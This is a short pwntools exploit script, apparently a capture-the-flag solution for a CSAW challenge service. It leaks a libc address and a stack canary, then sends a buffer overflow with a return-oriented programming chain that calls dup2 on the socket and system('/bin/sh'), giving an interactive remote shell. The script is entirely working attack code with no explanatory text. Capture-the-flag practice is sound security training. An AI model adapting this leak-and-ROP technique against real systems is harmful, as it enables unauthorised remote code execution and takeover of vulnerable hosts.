from pwn import *
from time import sleep

# ROP gadget
pop_rsi_r15 = 0x4012e1
pop_rdi = 0x4012e3

puts_base = 0x6fd60
system_base = 0x46590
bin_sh_base = 0x17c8c3
dup2_base = 0xebe90

r = remote('pwn.chal.csaw.io', 8002)

# leak libc address
print r.recvuntil('>')
r.sendline('1')
line = r.recvline()[:-1]
print line
puts_addr = int(line[-14:], 16) + 1280
libc_addr = puts_addr - puts_base
system_addr = libc_addr + system_base
bin_sh_addr = libc_addr + bin_sh_base
dup2_addr = libc_addr + dup2_base

# leak canary
print r.recvuntil('>')
r.sendline('2')
print r.recvuntil('>')
r.send(' ')
sleep(0.2)
data = r.recv()
canary = data[-12:-4]
print repr(data)

# ROP payload
print r.recvuntil('>')
r.sendline('2')
print r.recvuntil('>')
payload = 'A'*312 + canary + 'A'*8
payload += p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(0) + 'A'*8 + p64(dup2_addr) # dup2(4, 0)
payload += p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(1) + 'A'*8 + p64(dup2_addr) # dup2(4, 1)
payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)                         # system("/bin/sh")
r.send(payload)

r.interactive()
